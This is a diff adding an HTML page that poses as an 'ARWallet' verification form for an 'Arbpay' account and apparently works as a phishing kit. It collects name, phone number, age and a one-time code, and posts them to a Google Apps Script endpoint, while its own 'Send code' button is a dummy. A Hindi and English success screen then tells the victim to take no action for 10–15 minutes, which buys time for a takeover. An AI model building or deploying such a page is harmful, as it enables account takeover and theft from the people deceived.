@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ARWallet Verification</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: #f8f8f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: white;
+      width: 380px;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .header {
+      text-align: center;
+      font-size: 26px;
+      font-weight: bold;
+      color: #FFD700;
+      margin-bottom: 15px;
+    }
+
+    .sub-title {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #000;
+      font-size: 15px;
+      font-weight: bold;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      margin: 12px 0 8px;
+      font-size: 15px;
+      color: #333;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .phone-group {
+      display: flex;
+      gap: 12px;
+    }
+
+    .phone-group select {
+      width: 38%;
+    }
+
+    .phone-group input {
+      width: 62%;
+    }
+
+    .verification {
+      display: flex;
+      gap: 12px;
+      margin-top: 5px;
+    }
+
+    .verification button {
+      background: #FFD700;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    #otp-timer {
+      font-size: 13px;
+      color: #777;
+      margin-top: 8px;
+    }
+
+    .checkbox {
+      margin-top: 18px;
+      text-align: left;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+
+    .checkbox input {
+      margin-right: 6px;
+    }
+
+    .checkbox a {
+      color: #4a5bf7;
+      text-decoration: none;
+    }
+
+    .verify-btn {
+      background: #FFD700;
+      border: none;
+      width: 100%;
+      padding: 14px;
+      margin-top: 20px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .footer-text {
+      font-size: 13px;
+      margin-top: 10px;
+      color: #777;
+      text-align: left;
+      line-height: 1.5;
+    }
+
+    .footer-text a {
+      color: #4a5bf7;
+      text-decoration: none;
+    }
+
+    .form-section {
+      margin-bottom: 18px;
+    }
+
+    .success-container {
+      display: none;
+      text-align: center;
+    }
+
+    .checkmark {
+      font-size: 80px;
+      color: green;
+      margin: 20px 0;
+    }
+
+    .success-text {
+      color: green;
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .message {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .message-red {
+      font-size: 15px;
+      color: red;
+      margin-bottom: 15px;
+      line-height: 1.6;
+    }
+
+    .login-link a {
+      color: #4a5bf7;
+      text-decoration: none;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- FORM SECTION -->
+    <div id="form-section">
+      <div class="header">ARWallet</div>
+      <p class="sub-title">Verify your Arbpay account</p>
+
+      <form onsubmit="return validateForm()">
+        <div class="form-section">
+          <label for="firstName">Full Name</label>
+          <div style="display:flex; gap:12px;">
+            <input type="text" id="firstName" placeholder="First Name" required>
+            <input type="text" id="lastName" placeholder="Last Name" required>
+          </div>
+        </div>
+
+        <div class="form-section">
+          <label for="phone">Phone Number</label>
+          <div class="phone-group">
+            <select>
+              <option>+91 (India)</option>
+              <option>+1 (USA)</option>
+              <option>+44 (UK)</option>
+              <option>+61 (Australia)</option>
+            </select>
+            <input type="text" id="phone" placeholder="Phone Number" maxlength="10" required>
+          </div>
+        </div>
+
+        <div class="form-section">
+          <label for="age">Your Age</label>
+          <input type="number" id="age" placeholder="Age" required>
+        </div>
+
+        <div class="form-section">
+          <label for="otp">Verification Code</label>
+          <div class="verification">
+            <input type="text" id="otp" placeholder="Enter Code" maxlength="6" minlength="6" required>
+            <button type="button" id="sendOtpBtn" onclick="sendOTP()">Send</button>
+          </div>
+          <div id="otp-timer"></div>
+        </div>
+
+        <p class="footer-text">
+          Can't receive the verification code? <a href="#">Customer Service</a> or <a href="#">Reset OTP</a>
+        </p>
+
+        <div class="checkbox">
+          <input type="checkbox" id="agree" required>
+          I have agreed to and read the <a href="#">User Agreement</a>
+        </div>
+
+        <button class="verify-btn" type="submit">Verify account</button>
+      </form>
+    </div>
+
+    <!-- SUCCESS SECTION -->
+    <div id="success-section" class="success-container">
+      <div class="header">ARWallet</div>
+      <div class="checkmark">✔</div>
+      <div class="success-text">Verification Successful!</div>
+      <div class="message">Please wait 10–15 minutes for processing.</div>
+
+      <div class="message-red">
+        कृपया 10–15 मिनट प्रतीक्षा करें।<br>
+        अगर आप इस समय कुछ भी करेंगे तो पैसा होल्ड हो जाएगा<br>
+        और रिस्क कंपनी जिम्मेदारी नहीं लेगी।<br>
+        अभी आपको कुछ नहीं करना है।
+      </div>
+
+      <div class="message-red">
+        Please wait 10–15 minutes.<br>
+        If you take any action now, your money will be put on hold<br>
+        and the company will not be responsible.<br>
+        Do not do anything right now.
+      </div>
+
+      <div class="login-link">
+        <a href="#" onclick="goBack()">Go to Login</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ✅ Web App URL (यह आपका Google Script URL है)
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbziS0P9sKLdtfs3RPcX0swyqpCnoiDKc3joCT-oTTDQwqyDHk1xX8B4Dgilh3ROCgnJ/exec";
+
+    // OTP Function (Dummy OTP)
+    function sendOTP() {
+      const phone = document.getElementById('phone').value.trim();
+      if (!/^\d{10}$/.test(phone)) {
+        alert('कृपया सही 10 अंकों का फोन नंबर डालें।');
+        return;
+      }
+
+      const sendOtpBtn = document.getElementById('sendOtpBtn');
+      const otpTimer = document.getElementById('otp-timer');
+
+      let timeLeft = 30;
+      sendOtpBtn.disabled = true;
+      sendOtpBtn.innerText = "Sent";
+      otpTimer.innerText = `You can resend OTP in ${timeLeft}s`;
+
+      const countdown = setInterval(() => {
+        timeLeft--;
+        otpTimer.innerText = `You can resend OTP in ${timeLeft}s`;
+        if (timeLeft <= 0) {
+          clearInterval(countdown);
+          sendOtpBtn.disabled = false;
+          sendOtpBtn.innerText = "Send";
+          otpTimer.innerText = "";
+        }
+      }, 1000);
+
+      alert("OTP sent successfully! (Dummy OTP: 123456)");
+    }
+
+    // Form Submission
+    async function validateForm() {
+      const firstName = document.getElementById('firstName').value.trim();
+      const lastName = document.getElementById('lastName').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const age = document.getElementById('age').value.trim();
+      const otp = document.getElementById('otp').value.trim();
+      const agree = document.getElementById('agree').checked;
+
+      if (!firstName || !lastName) {
+        alert('कृपया अपना पूरा नाम दर्ज करें।');
+        return false;
+      }
+      if (!/^\d{10}$/.test(phone)) {
+        alert('फोन नंबर 10 अंकों का होना चाहिए।');
+        return false;
+      }
+      if (!/^\d{6}$/.test(otp)) {
+        alert('OTP 6 अंकों का होना चाहिए।');
+        return false;
+      }
+      if (!agree) {
+        alert('कृपया User Agreement को मानें।');
+        return false;
+      }
+
+      const formData = { firstName, lastName, phone, age, otp, agree };
+
+      try {
+        const response = await fetch(SCRIPT_URL, {
+          method: 'POST',
+          body: JSON.stringify(formData),
+          headers: { 'Content-Type': 'application/json' }
+        });
+
+        const result = await response.text();
+        if (result.includes("Success")) {
+          document.getElementById('form-section').style.display = 'none';
+          document.getElementById('success-section').style.display = 'block';
+        } else {
+          alert('Error: ' + result);
+        }
+      } catch (error) {
+        alert('नेटवर्क त्रुटि: ' + error);
+      }
+
+      return false;
+    }
+
+    function goBack() {
+      document.getElementById('success-section').style.display = 'none';
+      document.getElementById('form-section').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
+ 
